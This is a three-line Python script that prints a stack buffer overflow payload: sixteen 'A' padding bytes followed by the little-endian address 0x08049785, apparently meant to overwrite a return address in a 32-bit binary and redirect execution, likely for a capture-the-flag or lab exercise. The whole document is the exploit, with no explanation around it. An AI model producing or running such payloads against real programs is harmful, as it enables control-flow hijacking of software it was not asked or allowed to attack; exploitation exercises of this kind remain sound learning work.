from struct import pack  
import sys 

sys.stdout.buffer.write(b'A'*16 + pack("<I", 0x08049785))